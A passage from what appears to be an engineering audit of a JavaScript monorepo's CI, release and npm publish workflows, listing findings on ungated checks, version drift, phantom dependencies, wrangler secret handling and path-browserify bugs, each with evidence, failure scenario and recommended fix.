# the sole package.json read in the workflow is the Windows-only assertion at line 653-654, which compares the installer to package.json, never to the tag
failure_scenario: Someone tags v2.5.0 while package.json still says 2.4.14-beta.2 (the current root version). The build succeeds, the Windows assertion passes because installer and latest.yml both say 2.4.14-beta.2, and the release is published as v2.5.0 / prerelease=false with a manifest claiming version 2.5.0 while shipping 2.4.14-beta.2 binaries. `release:notes:verify` does perform exactly this tag-vs-version check but is only wired into the PR gate, not into the release.
recommendation: Run `node scripts/release-notes-gateway.mjs verify --tag "$TAG"` (or an equivalent assertion) as the first step of the build job.

title: @talex-touch/utils is published with raw `npm publish`, skipping the manifest protocol gate
summary: Every other package publishes through scripts/publish-package.mjs, which runs validate-publish-manifests.mjs --pack and rejects catalog:/workspace:/file:/link: specs in the packed manifest. The utils workflow calls `npm publish` directly, and `publish:check` is not run by any workflow.
evidence:
npm publish --access public --tag "${dist_tag}" >"${publish_log}" 2>&1

# scripts/package-publish.config.mjs
export const packedForbiddenProtocols = ['catalog:', 'workspace:', 'file:', 'link:']
# scripts/publish-package.mjs:197
run(`node scripts/validate-publish-manifests.mjs --filter "${packageInfo.name}" --pack`)
failure_scenario: Adding an intra-repo dependency to packages/utils in the normal monorepo way (`"@talex-touch/tuff-core": "workspace:*"` or a `catalog:` entry) publishes that literal spec to the registry, because npm — unlike pnpm publish — does not rewrite workspace protocols. Every external consumer's install then fails with EUNSUPPORTEDPROTOCOL, and the bad version cannot be unpublished after 72h.
recommendation: Publish utils through `node scripts/publish-package.mjs --filter "@talex-touch/utils"` like the other packages, and add `publish:check` to the PR gate.

title: apps/nexus has no CI workflow: build, lint, typecheck, test and check:* gates never run
summary: apps/nexus is the production Cloudflare deployment (wrangler.toml binds prod D1, R2 and KV), and its package.json defines build, lint, typecheck, test, check:api-routes, check:mdc-fences, check:preview-secrets and check:runtime-evidence. No workflow invokes any of them; the only nexus code CI touches is one vitest file inside test:targeted and server/utils/** via the intelligence gate.
evidence:
- name: Run PR quality gate
        run: pnpm quality:pr

# apps/nexus scripts: build, check:api-routes, check:mdc-fences, check:preview-secrets, check:runtime-evidence, ..., lint, typecheck, test
# grep over .github/workflows: no job runs any of them
failure_scenario: A PR that breaks the Nuxt build, a nexus type error, or a leaked preview secret that `check:preview-secrets` is designed to catch merges green. The failure first appears in the Cloudflare Pages build after merge, i.e. directly against the production project, with no pre-merge signal.
recommendation: Add a nexus workflow (paths-filtered on apps/nexus/**) that runs typecheck, lint, test, the check:* gates and build.

title: typecheck:all is never run in CI; only apps/core-app is type-checked
summary: The PR gate ends with `pnpm -C "apps/core-app" run typecheck`. The workspace-wide `typecheck:all` script exists but no workflow calls it, so tuff-cli, tuff-cli-core, tuff-core, tuff-intelligence, intelligence-uikit, tuff-business and nexus are never type-checked by CI.
evidence:
"typecheck:all": "pnpm -F @talex-touch/unplugin-export-plugin run build && pnpm -F @talex-touch/tuffex run build && pnpm -r --if-present --filter '!@talex-touch/tuffex' run typecheck",

# quality:pr ends with: corepack pnpm -C "apps/core-app" run typecheck
failure_scenario: A breaking type change in packages/utils that only affects packages/tuff-cli compiles fine in the PR gate and is caught only when the CLI publish workflow runs `pnpm --filter @talex-touch/tuff-cli run build` on master — after merge, in the job that publishes to npm.
recommendation: Run typecheck:all in a scheduled or paths-filtered CI job, or extend the PR gate to the packages a change touches.

title: plugins:validate is wired into no workflow, so plugin manifests are never gated
summary: scripts/validate-plugins.mjs checks manifest.json validity, entry-point syntax, permission IDs and searchProvider/permission consistency across all 25 plugin directories, and exits 1 on errors. Neither it nor validate-plugin-package-policy.ts runs in any GitHub workflow.
evidence:
"plugins:validate": "tsx scripts/validate-plugin-package-policy.ts && node scripts/validate-plugins.mjs",

# scripts/validate-plugins.mjs:272
if (hasErrors) {
  console.error('\x1B[31mValidation failed with errors.\x1B[0m\n')
  process.exit(1)

# grep 'plugins:validate' over .github/workflows: no match
failure_scenario: A PR lands a manifest.json with a syntax error in its Prelude, an unknown permission id, or a searchProvider whose permissionScopes are not backed by declared permissions. CI is green; the plugin fails to load only at runtime in the packaged app, where these plugins are bundled as built-ins.
recommendation: Add `pnpm plugins:validate` to the PR quality gate, paths-filtered on plugins/**.

title: privacy:inventory:verify (sensitive-data inventory gate) never runs in CI
summary: scripts/verify-sensitive-data-inventory.mjs is a 16KB deterministic verifier wired to a package script, but no workflow invokes it, so the sensitive-data inventory it guards can drift from the code without any CI signal.
evidence:
"privacy:inventory:verify": "node scripts/verify-sensitive-data-inventory.mjs",

# grep 'privacy:inventory' over .github/workflows: no match
failure_scenario: A change that starts collecting or transmitting a new class of user data without registering it in the inventory merges unnoticed; the drift is only discovered if a maintainer remembers to run the script by hand before a release.
recommendation: Run it in the PR gate (or at minimum in a release-readiness workflow) so inventory drift blocks the merge.

title: Secret-named keys are declared as plaintext wrangler vars, overwriting Worker secrets on deploy
summary: [env.production.vars] declares RESEND_API_KEY (and preview declares GITHUB_CLIENT_ID, LINUXDO_CLIENT_ID, ADMIN_CF_ACCESS_CLIENT_ID, ADMIN_OOB_MTLS_FINGERPRINTS) as empty plaintext vars. Vars and secrets share one binding namespace, and vars in the config file are re-applied on every deploy.
evidence:
[env.production.vars]
NODE_OPTIONS = "--max-old-space-size=6144"
AUTH_ORIGIN = "https://tuff.tagzxia.com"
AUTH_EMAIL_FROM = "tuff@tagzxia.com"
LINUXDO_ISSUER = "https://connect.linux.do"
RESEND_API_KEY = ""
failure_scenario: An operator sets RESEND_API_KEY with `wrangler secret put` so transactional mail works; the next production deploy re-uploads the empty string from this file over the binding and email silently starts failing with an empty API key. The same pattern also invites a real key to be committed here in plaintext.
recommendation: Delete secret-valued keys from [vars] and manage them exclusively as secrets; keep only genuinely public configuration in the config file.

title: check-release-gates defaults to a hardcoded tag v2.4.7 when --tag is omitted
summary: The release-gate CLI falls back to the literal tag v2.4.7 (and derives --version from it) instead of reading the repository version or failing. The root package is currently 2.4.14-beta.2.
evidence:
const tag = getArgValue(argv, '--tag', 'v2.4.7')
const version = getArgValue(argv, '--version', tag.replace(/^v/, ''))
failure_scenario: An operator runs `node scripts/check-release-gates.mjs --strict` during a release. The notes check validates notes/update_2.4.7.*.md, the manifest and version-baseline checks target 2.4.7, and the summary JSON reports pass for a release that shipped two years of versions later — a gate that reports success about the wrong artifact.
recommendation: Default the tag to `v${rootPackageVersion}` or require --tag explicitly.

title: check-release-gates exits 0 on failed checks unless --strict is passed
summary: The aggregated result is printed as JSON, but the process only exits non-zero when the caller remembers `--strict`. A `fail` result without that flag is indistinguishable from success to any shell or CI step.
failure_scenario: A release runbook step or future workflow invokes the gate without --strict; failed manifest validation and violated release-notes contracts print into the log and the step reports success, so the release proceeds on a gate that actually failed.
recommendation: Exit non-zero on `fail` by default and keep a `--no-strict`/report-only opt-out for exploratory runs.

title: First release in a channel cannot publish: rollback resolver throws with no predecessor
summary: resolveSameChannelRollbackVersion throws when no earlier tag exists in the same channel. Both the create-release and sync-nexus-release jobs call it under `set -euo pipefail`, so the throw fails the whole release.
evidence:
const previous = candidates[0]
  if (!previous)
    throw new Error(`No same-channel predecessor exists for ${tag}`)

# .github/workflows/build-and-release.yml:1038-1041
set -euo pipefail
rollback=$(node scripts/resolve-update-rollback-version.mjs --tag ... --remote origin)
failure_scenario: The first tag pushed in a channel that has no history (for example the first snapshot tag, or the first stable tag if only beta tags exist) fails the Resolve same-channel rollback version step after all three platform builds have already completed, with no way to proceed short of editing the workflow.
recommendation: Emit an explicit null rollbackFromVersion for a channel's first release and let the manifest contract handle the empty case.

title: Published-manifest verification silently passes when the npm view call fails
summary: verifyRegistryManifest is the post-publish check that the registry copy contains no catalog:/workspace:/file:/link: specs. Its catch block rethrows only its own error message; any failure of the `npm view` command itself is swallowed and the check reports success.
failure_scenario: A registry hiccup, rate limit, proxy error or auth failure makes `npm view <pkg>@<version> dependencies --json` exit non-zero. The loop swallows it for all three dependency fields and publish-package.mjs exits 0, reporting a verified publish while nothing was actually verified.
recommendation: Distinguish command failure from a clean empty result and fail the publish when the manifest cannot be read.

title: The only lint gate in CI drops --max-warnings, so every ESLint warning is unenforced
summary: CI lints exclusively through `quality:pr` -> `lint:changed` -> run-eslint-changed.mjs, whose eslint argv has no --max-warnings. The root `pnpm lint` does pass --max-warnings=0 but is never invoked by any workflow, and apps/core-app's own lint script passes --quiet, which discards warnings outright.
evidence:
const args = [
    'pnpm',
    '-C',
    workspace,
    'exec',
    'eslint',
    '--cache',
    '--no-warn-ignored',
    ...files,
  ]

# package.json root lint: eslint --cache --max-warnings=0 --no-warn-ignored ...
# apps/core-app package.json: "lint": "eslint --cache . --quiet"
failure_scenario: apps/core-app/eslint.config.mjs sets `@typescript-eslint/no-explicit-any: 'warn'` and `@typescript-eslint/no-unused-vars: ['warn', ...]`. A PR adding explicit `any` types and unused variables produces warnings that CI prints and then passes, so these rules are decorative: no configured warning can ever fail a build.
recommendation: Add --max-warnings=0 to the argv in lintWorkspace/lintRoot and drop --quiet from the core-app lint script so local and CI enforcement agree.

title: pnpm lint and lint-staged never cover plugins/touch-dictation
summary: `pnpm lint` reaches plugin code two ways: `--filter "./plugins/*"` (workspace packages, requires package.json) and a hardcoded brace list for the package.json-less plugin directories. touch-dictation is in neither, and lint-staged has entries only for touch-image, touch-music and touch-translation.
evidence:
"plugins/{touch-window-manager,touch-window-presets,touch-dev-toolbox,touch-batch-rename,touch-browser-bookmarks,touch-browser-open,touch-system-actions,touch-text-snippets,touch-snipaste,touch-quick-actions,touch-code-snippets}/**/*.{js,jsx,ts,tsx,vue,mjs,cjs,cts,mts}"

# plugins/touch-dictation has no package.json and is absent from this list; plugins/touch-dictation/index.js exists
failure_scenario: Full-repo lint runs and pre-commit lint-staged both report clean while plugins/touch-dictation/index.js (the Prelude the app loads) is never checked. Only the changed-file path (run-eslint-changed.mjs, which falls back to a root-cwd eslint run) sees it, so a lint error introduced by a non-PR path such as a direct push or a bulk refactor stays invisible. Every future package.json-less plugin repeats the omission, because the list is maintained by hand.
recommendation: Enumerate plugin directories from the filesystem instead of hardcoding them, or give each plugin a package.json so `./plugins/*` covers it.

title: utils and tuffex publish workflows crash when github.event.before is not a reachable commit
summary: Both workflows run `git show "$before_sha:<pkg>/package.json"` under `set -e`. The sibling CLI publish workflow guards the same call with `git cat-file -e`; these two do not.
evidence:
previous_version=$(git show "${before_sha}:packages/utils/package.json" | node -e "...")

# .github/workflows/package-tuff-cli-publish.yml:89-92 has the guard the others lack
            if ! git cat-file -e "${sha}^{commit}" >/dev/null 2>&1; then
              echo ""
              return 0
            fi
failure_scenario: After a force-push to master (or a branch rewrite that orphans the previous head), `github.event.before` points at a commit that is not reachable in the fetched history. `git show` exits non-zero, pipefail propagates it, and the publish workflow fails at the version check — so a genuine version bump in that same push is never published, with a git error as the only clue.
recommendation: Reuse the `git cat-file -e` guard from package-tuff-cli-publish.yml in both workflows and treat an unreachable before_sha as 'no previous version'.

title: npm publish workflows have no concurrency group, so two pushes race on the same version
summary: None of the four publish workflows declares `concurrency`, unlike ci.yml, intelligence.yml and native-protocol.yml. Two pushes to master in quick succession start two publish jobs that both pass the `npm view` existence check and then both call publish.
evidence:
jobs:
  publish:
    name: Publish - utils
    runs-on: ubuntu-latest

# and the workaround this race already required:
          if grep -Eqi 'previously published versions|cannot publish over the previously published version' "${publish_log}"; then
            if npm view "@talex-touch/utils@${version}" version >/dev/null 2>&1; then
              echo "... became available during publish. Treating duplicate publish as success."
failure_scenario: Two commits land seconds apart. Both runs read the same version, both find it absent from npm, both build and publish; one wins and the other has to be rescued by the duplicate-publish string match quoted above. That fallback matches on npm's English error text, so an npm message change turns the race into a red publish job on master.
recommendation: Add `concurrency: { group: publish-<pkg>, cancel-in-progress: false }` to each publish workflow.

title: @talex-touch/tuffex ships CommonJS dist/lib inside a "type":"module" package; require() fails
summary: tuffex declares "type":"module" but its `main` and its `require` export condition both point at dist/lib/*.js, which the gulp build emits in CommonJS syntax. Node parses those .js files as ESM because of the package type, so every CJS consumer of the published package explodes on load.
evidence: packages/tuffex/package.json:17 "type": "module", :18 "main": "dist/lib/index.js", :25 "require": "./dist/lib/index.js"  —  packages/tuffex/dist/lib/index.js:1 `'use strict';` :3 `Object.defineProperties(exports, { __esModule: { value: true }, ... });` :5 `const components = require('./components.js');`
failure_scenario: Reproduced on Node 24.18.0: importing packages/tuffex/dist/lib/index.js throws `exports is not defined in ES module scope. This file is being treated as an ES module because it has a '.js' file extension and '.../packages/tuffex/package.json' contains "type": "module". To treat it as a CommonJS script, rename it to use the '.cjs' file extension.` Any external consumer doing require('@talex-touch/tuffex') or bundling with the `require` condition (Jest, webpack CJS output, Electron main without ESM) fails at load. tuffex is published to npm (v0.3.9, MIT, files:[dist]).
recommendation: Emit dist/lib as .cjs (or add a dist/lib/package.json with {"type":"commonjs"}) and point the `require` condition at it.

title: Published @talex-touch/utils has main:"index.ts"; Node 24 cannot load it
summary: @talex-touch/utils is a public npm package (private:false, v1.0.50) whose entry point is a raw TypeScript file using ESM `export *` with extensionless directory specifiers. Node 24 strips the types, treats the file as ESM, and then cannot resolve the directory re-exports.
evidence: packages/utils/package.json:18 "main": "index.ts", :19 "module": "./index.ts", :4 "private": false  —  packages/utils/index.ts:2 `export * from './account'` (extensionless directory specifier, no `exports` map and no `types` field in package.json)
failure_scenario: Reproduced on Node 24.18.0: `require('@talex-touch/utils')` throws `ERR_UNSUPPORTED_DIR_IMPORT: Directory import '.../packages/utils/account' is not supported resolving ES modules imported from .../packages/utils/index.ts`. Any external plugin developer consuming the published package from plain Node, or from any bundler that does not alias TS sources, cannot import it at all — only the in-repo electron-vite/Vite aliases make it work.
recommendation: Publish a built dist (ESM+CJS+.d.ts) with an `exports` map, or at minimum add explicit file extensions and an `exports` field.

title: touch-image installs unplugin-export-plugin 0.2.13 from npm, not the workspace 1.2.16
summary: touch-image declares a semver range instead of `workspace:*`, and the range excludes the workspace version, so pnpm installs the pre-1.0 registry copy alongside the local one.
evidence: plugins/touch-image/package.json:48 `"@talex-touch/unplugin-export-plugin": "^0.2.13",` while packages/unplugin-export-plugin/package.json:4 is `"version": "1.2.16"`. pnpm-lock.yaml:1189 records `specifier: ^0.2.13 / version: 0.2.13` and pnpm-lock.yaml:5409 `'@talex-touch/unplugin-export-plugin@0.2.13': resolution: {integrity: sha512-Jh8jwvkcreTrKhua2xbqfWE+...}` — a registry tarball, not a workspace link.
failure_scenario: Building plugins/touch-image runs the 0.2.13 plugin, which predates every API change made in 1.x (the sibling plugin touch-translation uses `workspace:^`). Fixes and manifest-schema changes landed in the workspace package silently do not apply to touch-image, and the two plugins emit packages built by different, incompatible builders.
recommendation: Change to `"@talex-touch/unplugin-export-plugin": "workspace:^"` to match plugins/touch-translation.

title: Catalog pins @langchain/langgraph ^0.2.74 while every consumer hard-codes ^0.4.9
summary: The shared catalog entry for langgraph is two breaking minors behind what the code actually installs, and no package references it via `catalog:`, so the catalog is stale documentation that will silently downgrade anything that starts using it.
evidence: pnpm-workspace.yaml:41 `'@langchain/langgraph': ^0.2.74` — but apps/core-app/package.json:99, apps/nexus/package.json:48 and packages/tuff-intelligence/package.json:56 all declare `"@langchain/langgraph": "^0.4.9"` literally. A repo-wide grep for `"@langchain/langgraph": "catalog:"` returns 0 hits.
failure_scenario: The moment any package switches to `catalog:` (the stated convention for shared deps) pnpm installs 0.2.74. LangGraph is pre-1.0, so 0.2 → 0.4 crosses two breaking-change boundaries: the 0.4 graph/state APIs used in packages/tuff-intelligence do not exist in 0.2.74 and the build fails to typecheck.
recommendation: Update the catalog entry to ^0.4.9 and switch the three consumers to `catalog:`.

title: Catalog pins @langchain/openai ^0.3.17 while every consumer hard-codes ^0.4.9
summary: Same drift as langgraph: the catalog entry is a breaking minor behind the version actually installed, and nothing references it via `catalog:`.
evidence: pnpm-workspace.yaml:42 `'@langchain/openai': ^0.3.17` versus apps/core-app/package.json:100 `"@langchain/openai": "^0.4.9"` and apps/nexus/package.json:49 `"@langchain/openai": "^0.4.9"`. Grep for `"@langchain/openai": "catalog:"` returns 0 hits.
failure_scenario: Adopting `catalog:` for @langchain/openai downgrades to 0.3.17, whose peer range and ChatOpenAI option shape differ from 0.4.x; the AI provider wiring in apps/core-app/src/main/modules/ai stops typechecking against @langchain/core 0.3.80.
recommendation: Bump the catalog entry to ^0.4.9 (or delete the entry if the catalog is not intended to cover it).

title: Catalog pins next-auth ~4.21.1 while apps/nexus installs ~4.24.14
summary: Two contradictory next-auth pins exist in pnpm-workspace.yaml (the main catalog and a generated conflicts_ catalog), neither is referenced by any package, and the real consumer hard-codes a third literal range.
evidence: pnpm-workspace.yaml:54 `next-auth: ~4.21.1`, pnpm-workspace.yaml:102-103 `conflicts_next-auth_t4_24_14: next-auth: ~4.24.14`, apps/nexus/package.json:88 `"next-auth": "~4.24.14"`. package.json:208 then widens the peer check with `"next-auth": "~4.21.1 || ~4.24.14"`. Grep for `"next-auth": "catalog:` returns 0 hits.
failure_scenario: The catalog claims 4.21.x is the supported version while the app runs 4.24.x. @sidebase/nuxt-auth 0.9.4 peers on next-auth 4.21.x; the allowedVersions escape hatch silences the mismatch instead of resolving it, so a genuine 4.21-vs-4.24 API break in the auth handler (apps/nexus/nuxt.config.ts:48 reaches into next-auth/core/index.js directly) surfaces only at runtime.
recommendation: Delete the conflicts_ catalog, set the single catalog entry to ~4.24.14, and have apps/nexus use `catalog:`.

title: nodemailer: catalog says ^9.0.3, peer rule allows only ^6||^7, and it is not installed at all
summary: Three sources disagree about nodemailer and none of them match reality: the catalog pins ^9.0.3, the peerDependencyRules allow ^6.6.5||^7.0.0 (which ^9.0.3 does not satisfy), and the package is absent from the lockfile.
evidence: pnpm-workspace.yaml:55 `nodemailer: ^9.0.3`; package.json:207 `"nodemailer": "^6.6.5 || ^7.0.0"` under pnpm.peerDependencyRules.allowedVersions; pnpm-lock.yaml:1541 and :10546 record the peer requirement `nodemailer: ^7` / `^7.0.7` from @auth/core and next-auth, but `grep -n '^  nodemailer@' pnpm-lock.yaml` returns no snapshot — nothing is installed (auto-install-peers=false, .npmrc:2).
failure_scenario: Any code path in apps/nexus that reaches the @auth/core or next-auth Email provider throws MODULE_NOT_FOUND at runtime because nodemailer was never installed. If someone fixes that by adopting `catalog:`, they get ^9.0.3, which is outside the ^7 peer range the providers declare and outside the allowedVersions override, so the peer warning returns.
recommendation: Decide whether the email provider is used: either add nodemailer ^7 as a real dependency of apps/nexus and align both entries, or delete the catalog entry and the allowedVersions rule.

title: Three incompatible majors of marked installed simultaneously (12.0.2, 16.4.2, 17.0.6)
summary: tuffex pins marked ^12 while @talex-touch/utils and the root toolchain pin ^17, and a third copy at 16.4.2 is pulled transitively. The core-app renderer bundles both tuffex and utils, so two markdown engines with different renderer/extension APIs ship in one bundle.
evidence: packages/tuffex/package.json:84 `"marked": "^12.0.2",` vs packages/utils/package.json:64 `"marked": "^17.0.6",` and package.json:? root devDependency `"marked": "17.0.6"`. pnpm-lock.yaml:10111/10116/10121 record `marked@12.0.2`, `marked@16.4.2`, `marked@17.0.6` as three distinct snapshots.
failure_scenario: marked 13 removed the sync/async `parse` overloads and 14-16 reworked the tokenizer/renderer extension signatures. tuffex's TxStreamMarkdown renderer extensions are written against v12 and would break if hoisting ever resolves it to 17; conversely utils' markdown helpers cannot run on 12. Both are bundled into the same Electron renderer output, duplicating ~50KB and producing inconsistent rendering between tuffex and utils code paths.
recommendation: Align tuffex to marked ^17 (or move marked to a catalog entry so one version is enforced).

title: compressing pinned to incompatible majors: ^1.10.5 in tuff-cli/tuff-cli-core vs ^2.1.1 in core-app
summary: The plugin builder CLI and the app that consumes its output use different majors of the archive library, and both are installed.
evidence: packages/tuff-cli-core/package.json:37 `"compressing": "^1.10.5",` and packages/tuff-cli/package.json:35 `"compressing": "^1.10.5",` versus apps/core-app/package.json:112 `"compressing": "^2.1.1",`. pnpm-lock.yaml:7272/7276 record both `compressing@1.10.5` and `compressing@2.1.1`.
failure_scenario: compressing 2.x dropped Node <18 support and changed the stream/promise API surface; the plugin `.touch-plugin` archives are written by tuff-cli on v1 and unpacked by core-app on v2. Any format or option divergence between the two majors (e.g. zip entry mode handling) shows up only when a plugin built by the CLI is installed into the app.
recommendation: Bump tuff-cli and tuff-cli-core to compressing ^2.1.1 so writer and reader share one implementation.

title: tuff-cli-core declares @types/node ^18.19.130 under a Node >=24.15 workspace
summary: The package declares Node 18 typings but a global pnpm override silently swaps in 24.13.2, so it typechecks green in-repo against APIs its own manifest says are unavailable.
evidence: packages/tuff-cli-core/package.json:48 `"@types/node": "^18.19.130",` while package.json:134 forces `"@types/node": "24.13.2"` in pnpm.overrides and package.json:10 declares `"engines": {"node": ">=24.15.0"}`. The package's own engines field (packages/tuff-cli-core/package.json:21) says `">=24.0.0"`.
failure_scenario: Inside the workspace the override hides the mismatch. Building this package outside the monorepo (or after the override is removed) installs @types/node 18, and any Node 20+/22+ API used in src — e.g. `node:fs/promises` additions, `structuredClone`, glob options — fails to typecheck with 'Property does not exist'. The declared range also misrepresents the package's real runtime requirement to anyone reading the manifest.
recommendation: Set @types/node to ^24.13.2 to match engines and the override.

title: unplugin-export-plugin (published v1.2.16) declares @types/node ^18.19.130 under a Node 24 workspace
summary: A publicly published build plugin pins Node 18 typings while the workspace override forces 24.13.2, so its declared type baseline is never actually exercised.
evidence: packages/unplugin-export-plugin/package.json:78 `"@types/node": "^18.19.130",` with package.json:4 `"version": "1.2.16"` and publishConfig-less public publish via :64 `"release": "bumpp && npm publish --access public"`. Root package.json:134 overrides `"@types/node": "24.13.2"`.
failure_scenario: Contributors building this package standalone (the documented `pnpm unplugin:build`) outside the workspace get @types/node 18 and lose typings for anything added in Node 20-24; conversely code written against the overridden 24.x typings compiles in-repo but its declared devDependency claims Node 18 compatibility that was never verified.
recommendation: Align @types/node with the workspace override (^24.13.2) or drop the pin and rely on the catalog.

title: tuffex declares @types/node ^22.20.0, a third distinct Node typings baseline in the monorepo
summary: The monorepo carries three declared @types/node baselines (18, 22, 24) that are all silently collapsed to 24.13.2 by a root override, so none of the declarations is meaningful.
evidence: packages/tuffex/package.json:94 `"@types/node": "^22.20.0",` vs packages/tuff-cli-core/package.json:48 `"^18.19.130"` vs plugins/touch-translation/package.json:28 `"^24.13.2"`, all overridden by package.json:134 `"@types/node": "24.13.2"`.
failure_scenario: tuffex's tsconfig.json:17 sets `"types": ["vite/client", "node"]`, so its vue-tsc run resolves whatever @types/node the override supplies (24.x) rather than the declared 22.x. Removing the override — or building tuffex standalone for the npm publish workflow — changes the ambient Node typings under the components and can surface new errors that CI never saw.
recommendation: Standardise every package on ^24.13.2 (ideally via a `catalog:` entry) so the override becomes redundant.

title: core-app renderer imports 6 undeclared runtime packages (pinia, vue-i18n, @vueuse/core, gsap)
summary: The shipped Electron renderer imports six third-party packages that appear nowhere in apps/core-app's dependencies/devDependencies. They resolve only because .npmrc sets shamefully-hoist=true and other workspace packages happen to pull them in.
evidence: None of `pinia`, `vue-i18n`, `@vueuse/core`, `gsap`, `@floating-ui/vue`, `path-browserify` appear in apps/core-app/package.json (grep count 0 each). Import sites: apps/core-app/src/renderer/src/main.ts:10 `import { createPinia } from 'pinia'`; apps/core-app/src/renderer/src/composables/usePermissionStartup.ts:10 `import { useI18n } from 'vue-i18n'`; apps/core-app/src/renderer/src/App.vue:3 `import { until } from '@vueuse/core'`; apps/core-app/src/renderer/src/components/tuff/TuffGroupBlock.vue:3 `import gsap from 'gsap'`; apps/core-app/src/renderer/src/components/base/select/TSelect.vue:2 `import { computePosition } from '@floating-ui/vue'`; apps/core-app/src/renderer/src/views/box/tag/FileTag.vue:2 `import path from 'path-browserify'`.
failure_scenario: Turning off .npmrc:1 `shamefully-hoist=true` (pnpm default strict layout) makes `pnpm core:build` fail immediately with Vite 'Failed to resolve import "pinia" from src/renderer/src/main.ts'. Today all six resolve from the hoisted root tree (pinia@3.0.4, vue-i18n@11.4.0, @vueuse/core@14.3.0, gsap@3.15.0, @floating-ui/vue@1.1.11, path-browserify@1.0.1) — versions chosen by apps/nexus and packages/tuffex, not by core-app. vue-i18n in particular is present only as an optional peer of @intlify/unplugin-vue-i18n and @nuxtjs/i18n (a nexus devDependency), so the shipped Electron app's i18n runtime version is decided by the docs site.
recommendation: Add all six to apps/core-app dependencies with explicit ranges (pinia and @vueuse/core via `catalog:frontend`).

title: electron.vite.config.ts imports 7 build plugins that apps/core-app does not declare
summary: The core-app build config depends on Vite/UnoCSS/unplugin packages that are absent from its manifest; the build only works because of workspace-wide hoisting.
evidence: apps/core-app/electron.vite.config.ts:5-14 `import VueI18nPlugin from '@intlify/unplugin-vue-i18n/vite'`, `import vue from '@vitejs/plugin-vue'`, `import vueJsx from '@vitejs/plugin-vue-jsx'`, `import type { Plugin } from 'vite'`, `import Unocss from 'unocss/vite'`, `import AutoImport from 'unplugin-auto-import/vite'`, `import Components from 'unplugin-vue-components/vite'`. grep for each of `@intlify/unplugin-vue-i18n`, `@vitejs/plugin-vue`, `@vitejs/plugin-vue-jsx`, `unocss`, `unplugin-auto-import`, `unplugin-vue-components`, `vite` in apps/core-app/package.json returns 0.
failure_scenario: A clean install with pnpm's default (non-hoisted) node_modules, or a CI job that installs only the core-app filter (`pnpm -F @talex-touch/core-app install`), cannot load electron.vite.config.ts — `Cannot find package '@vitejs/plugin-vue'`. Vite 7 majors also arrive uncontrolled: the plugin versions come from whichever sibling package resolves them.
recommendation: Declare all seven in apps/core-app devDependencies, using `catalog:build` for vite/unocss.

title: core-app main process imports undeclared `plist` and `chalk`
summary: Two main-process runtime imports are not in apps/core-app's manifest. They currently survive packaging only because electron-vite's externalizeDepsPlugin externalizes declared dependencies only, so undeclared ones get inlined by accident.
evidence: apps/core-app/src/main/modules/box-tool/addon/files/services/file-provider-opener-service.ts:12 `import plist from 'plist'` and apps/core-app/src/main/utils/logger.ts:2 `import chalk from 'chalk'`. Neither `"plist"` nor `"chalk"` appears in apps/core-app/package.json (grep count 0). Note the manifest does declare a different package, `"simple-plist": "1.4.0"` (line 130).
failure_scenario: The behaviour is version-uncontrolled and fragile in both directions: today rollup inlines them (they are invisible to externalizeDepsPlugin at apps/core-app/electron.vite.config.ts:171), but the moment either is added to `dependencies` it becomes external and must exist in node_modules at runtime — and electron-builder.yml:159 sets `npmRebuild: false` with `files: node_modules/**` scoped to core-app, so a missing entry becomes a production MODULE_NOT_FOUND. A strict (non-hoisted) install breaks the build outright.
recommendation: Declare `plist` and `chalk` explicitly in apps/core-app dependencies.

title: .npmrc shamefully-hoist=true masks 18 undeclared dependencies in apps/core-app alone
summary: The workspace disables pnpm's strict node_modules isolation, which is the single reason 18 phantom dependencies resolves. It converts every missing manifest entry from an install-time error into a silent, version-uncontrolled binding.
evidence: .npmrc:1 `shamefully-hoist=true` combined with .npmrc:2 `auto-install-peers=false`. Scanning apps/core-app bare imports against its manifest yields 18 undeclared specifiers: 11 from src (pinia, vue-i18n, @vueuse/core, gsap, @floating-ui/vue, path-browserify, plist, chalk, electron, vitest, @vue/test-utils) and 7 from electron.vite.config.ts (@intlify/unplugin-vue-i18n, @vitejs/plugin-vue, @vitejs/plugin-vue-jsx, unocss, unplugin-auto-import, unplugin-vue-components, vite).
failure_scenario: Because hoisting is global, the resolved version of each phantom dependency is decided by whichever unrelated workspace package pulls it in. Bumping @talex-touch/tuffex's `gsap` or `@floating-ui/vue`, or apps/nexus's `pinia`, silently changes what the shipped Electron renderer bundles, with no entry in apps/core-app's lockfile importer to review. Removing the flag (or publishing any affected package) surfaces all 18 at once as unresolved-import build errors.
recommendation: Fix the phantom dependencies first, then drop shamefully-hoist (keep a narrow public-hoist-pattern for electron only, which .npmrc:3 already has).

title: safe-path.isAbsolutePath() throws TypeError in browser contexts: path-browserify win32 is null
summary: The shared path-safety helper falls back to path-browserify whenever `window` exists, then dereferences `path.win32`, which path-browserify sets to null.
evidence: packages/utils/common/utils/safe-path.ts:5-6 `if (hasWindow()) { return pathBrowserify }` and :34 `return path.isAbsolute(value) || path.win32.isAbsolute(value)`. Verified on the installed path-browserify@1.0.1: `require('path-browserify').win32` is `null`, and calling `.isAbsolute` on it throws `TypeError: Cannot read properties of null (reading 'isAbsolute')`. `hasWindow()` is `typeof window !== 'undefined'` (packages/utils/env/index.ts:79-81), which is true in the renderer, in preload, and in every plugin Surface WebContents.
failure_scenario: In a window context, `isAbsolutePath()` and therefore `normalizeAbsolutePath()` crash for any input that is not POSIX-absolute — i.e. every Windows path ('C:\\Users\\me\\file.txt') and every relative path — because the `||` only short-circuits when path.isAbsolute() is true. @talex-touch/utils is published for third-party plugin authors whose Surface code runs in exactly that context.
recommendation: Guard the win32 branch (`path.win32?.isAbsolute?.(value) ?? false`) or use an explicit drive-letter regex instead of relying on path-browserify's win32 shim.

title: Three renderer components use path-browserify on absolute paths, producing wrong output on Windows
summary: CoreBox file chips and result subtitles call basename/dirname/extname from path-browserify, which only understands '/' separators. On Windows the main process supplies backslash paths, so the UI shows the entire path instead of a file name.
evidence: apps/core-app/src/renderer/src/views/box/tag/FileTag.vue:27 `return path.basename(firstPath || '')`; apps/core-app/src/renderer/src/views/box/tag/UnifiedFileTag.vue:86 `return path.basename(filePaths.value[0])` and :67 `return path.extname(value).replace(/^\./, '').toLowerCase()`; apps/core-app/src/renderer/src/components/render/ItemSubtitle.vue:121 `{{ path.dirname(fileInfo.path).split('/').pop() }}` — all importing `path from 'path-browserify'`.
failure_scenario: Verified against the installed path-browserify@1.0.1 (sep === '/'): `basename('C:\\Users\\me\\Documents\\report.txt')` returns the full unchanged string and `dirname(...)` returns '.'. On Windows, every CoreBox file result chip renders the complete absolute path instead of 'report.txt', and ItemSubtitle renders '.' as the containing folder. macOS/Linux are unaffected, which is why it has not been caught.
